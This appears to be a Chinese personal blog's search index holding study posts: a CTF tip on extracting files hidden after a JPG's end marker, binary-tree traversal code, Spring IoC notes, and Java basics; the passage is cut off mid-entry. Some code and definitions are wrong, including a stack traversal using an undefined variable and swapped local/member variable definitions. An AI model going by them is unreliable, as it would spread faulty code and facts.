<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2022/2/18</title>
      <link href="/2022/02/18/2022-2-18/"/>
      <url>/2022/02/18/2022-2-18/</url>
      
        <content type="html"><![CDATA[<h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><p>第一种呢:就是下载 Linux虚拟机,一般都会自带 binwalk 和foremost 的，具体安装呢,可以自行百度，baidu  yyds ，这个linux很有用的 可以早学着</p><h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>不想安的呢,那就手动分离,</p><p>首先是一个jpg文件那我们搜一下,文件尾，既然有多个文件,那么我们就看一个文件尾之后就是那一个文件了,拖进winhex 搜索  jpg文件尾 ffd9</p><p><img src="https://img-blog.csdnimg.cn/81f703fd3dd94d08b3eb34d937425d4c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/9ee28d71ffaf4ba98ebd89be68af65e3.gif" alt="请添加图片描述"></p><p>最后捏</p><p>就拿到了</p><p>然后就可以快快乐乐的打卡啦</p><p><img src="https://img-blog.csdnimg.cn/ca63d63e37664f9a907df78576f4d4d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构---二叉树算法(-)</title>
      <link href="/2021/12/07/shu-ju-jie-gou-er-cha-shu-suan-fa/"/>
      <url>/2021/12/07/shu-ju-jie-gou-er-cha-shu-suan-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="数据结构—二叉树算法-一"><a href="#数据结构—二叉树算法-一" class="headerlink" title="数据结构—二叉树算法(一)"></a>数据结构—二叉树算法(一)</h2><blockquote><p>前言:温习一下数据结构的算法</p></blockquote><h3 id="递归算法"><a href="#递归算法" class="headerlink" title="递归算法"></a>递归算法</h3><blockquote><p>确定递归参数 以及返回值</p><p>确定终止条件</p></blockquote><h4 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h4><pre class="line-numbers language-none"><code class="language-none">逻辑就是:中左右 先访问中间节点然后在访问左边节点虽有就是右边节点<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>C++实现</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">struct TreeNode&#123;    int val;    TreeNode * left;    TreeNode * right;   &#125;;int main()&#123;    vector&lt;int&gt; result;    travel(purpose,result);   &#125;void travel(TreeNode *p,vector&lt;int&gt;&amp;vec)&#123;    if(p&#x3D;&#x3D;NULL)return ;    vec.push_back(p-&gt;val);    travel(p-&gt;left,vec);    travel(p-&gt;right,vec);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">preorderTraversal</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> root<span class="token punctuation">:</span> TreeNode<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">travel</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span>             result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>val<span class="token punctuation">)</span>            travel<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>left<span class="token punctuation">)</span>            travel<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>right<span class="token punctuation">)</span>                travel<span class="token punctuation">(</span>root<span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><p>改个顺序就ok了，因为这里是前左右 所以要一直递归到左叶子,然后在访问右叶子,（中叶子已经访问完毕</p><pre class="line-numbers language-none"><code class="language-none">def preorderTraversal(self, root: TreeNode) -&gt; List[int]:        result&#x3D;[]        def travel(temp):            if(temp&#x3D;&#x3D;None):                return             travel(temp.left)            result.append(temp.val)            travel(temp.right)                travel(root)        return result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="后续遍历"><a href="#后续遍历" class="headerlink" title="后续遍历"></a>后续遍历</h4><p>一个样子</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">preorderTraversal</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> root<span class="token punctuation">:</span> TreeNode<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">travel</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span>             travel<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>left<span class="token punctuation">)</span>            travel<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>right<span class="token punctuation">)</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>val<span class="token punctuation">)</span>                travel<span class="token punctuation">(</span>root<span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="非递归算法—前序遍历-用栈实现"><a href="#非递归算法—前序遍历-用栈实现" class="headerlink" title="非递归算法—前序遍历(用栈实现)"></a>非递归算法—前序遍历(用栈实现)</h3><blockquote><p>利用栈,因为是中左右 所以我们 首先是将右孩子放入栈中,然后才将左孩子放入,这样如果出栈的时候才是左 然后右 这就起到中左右的顺序 如果遍历节点过程不为空的话 就循环</p></blockquote><p>代码为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">preorderTraversal</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> root<span class="token punctuation">:</span> TreeNode<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>root<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>root<span class="token punctuation">)</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">:</span>            temp<span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>val<span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>                stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>right<span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">:</span>                stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>left<span class="token punctuation">)</span>        <span class="token keyword">return</span> result                        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="非递归算法—中序遍历-用栈实现"><a href="#非递归算法—中序遍历-用栈实现" class="headerlink" title="非递归算法—中序遍历(用栈实现)"></a>非递归算法—中序遍历(用栈实现)</h3><blockquote><p>中序遍历是从最左边叶子节点开始的,所以我们先遍历到最左边叶子节点, 遍历完成后, 此时root为NULL 所以弹出父节点,也就是左边叶子节点,访问存储,然后再遍历右节点.</p></blockquote><p>代码为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">preorderTraversal</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> root<span class="token punctuation">:</span> TreeNode<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">not</span> root<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    temp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> root <span class="token keyword">or</span> temp<span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">:</span>            temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>root<span class="token punctuation">)</span>            root<span class="token operator">=</span> root<span class="token punctuation">.</span>left <span class="token comment"># 遍历左边节点</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            root<span class="token operator">=</span> temp<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#开始访问节点</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span>            root<span class="token operator">=</span> root<span class="token punctuation">.</span>right<span class="token comment">#访问右孩子 没有的话将栈中元素弹出 继续访问上一层节点</span>    <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="非递归算法—后续遍历-用栈实现"><a href="#非递归算法—后续遍历-用栈实现" class="headerlink" title="非递归算法—后续遍历(用栈实现)"></a>非递归算法—后续遍历(用栈实现)</h3><blockquote><p>后续遍历是左右中    倒过来就是中右左    将前序遍历中的左和右互换一下就行了</p></blockquote><p>代码为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">preorderTraversal</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> root<span class="token punctuation">:</span> TreeNode<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">not</span> root<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        stack<span class="token operator">=</span><span class="token punctuation">[</span>root<span class="token punctuation">]</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">:</span>            temp<span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>val<span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">:</span>                stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>left<span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>                stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">.</span>right<span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java Spring框架学习(一)</title>
      <link href="/2021/11/24/java-spring-kuang-jia-xue-xi-yi/"/>
      <url>/2021/11/24/java-spring-kuang-jia-xue-xi-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="IoC控制反转"><a href="#IoC控制反转" class="headerlink" title="IoC控制反转"></a>IoC控制反转</h2><blockquote><pre class="line-numbers language-none"><code class="language-none">1）分为控制和反转控制:对象创建，属性赋值,对象声明周期管理反转:把开发人员管理对象的权限转移给了代码之外的容易实现,由容器完成对象的管理Spring就是一个容器,可以管理创建对象给对象赋值2）loc技术实现DI(依赖注入):只需要使用对象的名称就行,不用管怎么创建的查找的在容器中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="Spring-的配置文件"><a href="#Spring-的配置文件" class="headerlink" title="Spring 的配置文件"></a>Spring 的配置文件</h3><blockquote><pre class="line-numbers language-none"><code class="language-none">spring 标准配置文件:bean: bean就是java对象，spring 容器管理的java对象叫做bean id :自定义对象的名称,唯一值class:类的名称 spring 通过反射机制创建对象，不能是接口spring根据id class 创建对象 把对象放到spring 中的一个map对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>主文件实现</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RgylinM</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//SomeService service = new SomeServiceImpl();</span>        <span class="token comment">//service.doSome();</span>        <span class="token comment">//使用bean 创建对象</span>        <span class="token class-name">String</span> config<span class="token operator">=</span><span class="token string">"beans.xml"</span><span class="token punctuation">;</span>        <span class="token comment">//ApplicationContext 表示 spring 对象</span>        <span class="token comment">//通过类加载配置bean文件来实现创建对象 需要进行所需要的转型</span>        <span class="token class-name">ApplicationContext</span> ctt<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//从容器中获取指定对象名称</span>        <span class="token class-name">SomeService</span> temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">SomeService</span><span class="token punctuation">)</span>ctt<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"someService"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        temp<span class="token punctuation">.</span><span class="token function">doSome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>beans</p><pre class="line-numbers language-none"><code class="language-none">&lt;!--    id :自定义对象的名称,唯一值        class:类的名称 spring 通过反射机制创建对象，不能是接口        spring根据id class 创建对象 把对象放到spring 中的一个map对象--&gt;    &lt;bean id&#x3D;&quot;someService&quot; class&#x3D;&quot;org.example.impl.SomeServiceImpl&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以用普通类的创建</p><p>bean对象为</p><pre class="line-numbers language-none"><code class="language-none">&lt;bean id&#x3D;&quot;rgylin_ord&quot; class&#x3D;&quot;org.example.impl.Rgylin_ord&quot;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-GjtYJmeC-1637732677588)(C:\Users\ASUS\Desktop\QQ截图20211124133256.png)]</p><h3 id="测试spring是什么时候创建对象的"><a href="#测试spring是什么时候创建对象的" class="headerlink" title="测试spring是什么时候创建对象的"></a>测试spring是什么时候创建对象的</h3><p>首先写一个无参构造方法</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-HtSBvRqq-1637732677591)(C:\Users\ASUS\Desktop\QQ截图20211124125250.png)]</p><p>然后再text 包中就见一个MyText类去调用</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-nYSK6xcx-1637732677593)(C:\Users\ASUS\Desktop\QQ截图20211124125519.png)]</p><p>可以看到</p><blockquote><p>对象是在创建spring对象会读取其配置文件,并创建文件声明中的对象（默认执行无参构造方法),所以剩下的我们就可以取就行了速度大大提升</p><p>在创建容器对象ApplicationContext会把配置文件中所有的对象都创建出来</p></blockquote><p>获取容器对象的名称</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> config<span class="token operator">=</span><span class="token string">"beans.xml"</span><span class="token punctuation">;</span>    <span class="token class-name">ApplicationContext</span> temp<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> all<span class="token operator">=</span> temp<span class="token punctuation">.</span><span class="token function">getBeanDefinitionNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> i<span class="token operator">:</span>all<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"名字是"</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//名字是someService</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="spring-容器创建非定义类对象"><a href="#spring-容器创建非定义类对象" class="headerlink" title="spring 容器创建非定义类对象"></a>spring 容器创建非定义类对象</h3><p>以日期类为例</p><blockquote><p>首先在bean中创建类</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&lt;bean id&#x3D;&quot;rgylin_ddata&quot; class&#x3D;&quot;java.util.Date&quot;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>然后调用</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java">      <span class="token class-name">Date</span> my_data<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Date</span><span class="token punctuation">)</span>temp<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"rgylin_ddata"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>my_data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//得到结果</span>      <span class="token comment">//Wed Nov 24 13:24:46 CST 2021</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2817e1aab10243ab9fa7749d73458022.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fbdcc9915f894f2485fd8ec23affb17a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a5f33a36670d4cd492a95991e2ed39cd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><p><a href="https://www.bilibili.com/video/BV1hN411X77N">学习链接</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习从0到1</title>
      <link href="/2021/11/16/java-xue-xi-cong-0-dao-1/"/>
      <url>/2021/11/16/java-xue-xi-cong-0-dao-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近想接触一下JAVA安全,java的基本知识也忘了挺多,一步一步来加油!</p></blockquote><h3 id="局部变量-成员变量"><a href="#局部变量-成员变量" class="headerlink" title="局部变量 成员变量"></a>局部变量 成员变量</h3><p>局部变量</p><pre class="line-numbers language-none"><code class="language-none">特点:类里方法外,无需手动初始化,自动赋值为默认值,该定义的类消失才会消失<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成员变量</p><pre class="line-numbers language-none"><code class="language-none">特点:方法里或者局部代码块里,必须手动进行初始化, 执行完对应方法块会被释放<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>company</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyText</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//定义成员变量</span>    <span class="token class-name">String</span> name<span class="token operator">=</span><span class="token string">"rgylin"</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> age<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//定义局部变量会</span>        <span class="token keyword">int</span> age<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token comment">//定义局部变量</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//采用就近原则 输出100</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">MyText</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//采取类.调用类中静态成员变量</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意一点就是不能从静态方法中调用非静态变量  </p></blockquote><h3 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h3><blockquote><p>定义:指在一个类中定义多个同名的方法,但是每个方法的参数列表不同(指参数个数和类型不同,名字也可以不同),我们传递给不同参数个数和不同类型值的过程成为方法的重载</p></blockquote><p>测试代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>company</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyText</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">fanngfa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"无参执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">fanngfa</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"年龄是"</span><span class="token operator">+</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">fanngfa</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">,</span><span class="token keyword">double</span> score<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"多个参数被调用"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">fanngfa</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"名字是"</span><span class="token operator">+</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fanngfa</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">1.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">结果为   多个参数被调用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="java-数组"><a href="#java-数组" class="headerlink" title="java 数组"></a>java 数组</h3><h4 id="创建方式"><a href="#创建方式" class="headerlink" title="创建方式"></a>创建方式</h4><ol><li><p>动态初始化</p><pre class="line-numbers language-none"><code class="language-none">int[]a&#x3D; new int[5];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>静态初始化</p><pre class="line-numbers language-none"><code class="language-none">int[]a&#x3D; new int[]&#123;12,3,4,5&#125;;int[]a&#x3D;&#123;1,22,3,4&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>数组的属性</p><p>a.length 返回数组的长度</p></li></ol><p>例子:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>company</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyText</span> <span class="token punctuation">&#123;</span>    <span class="token 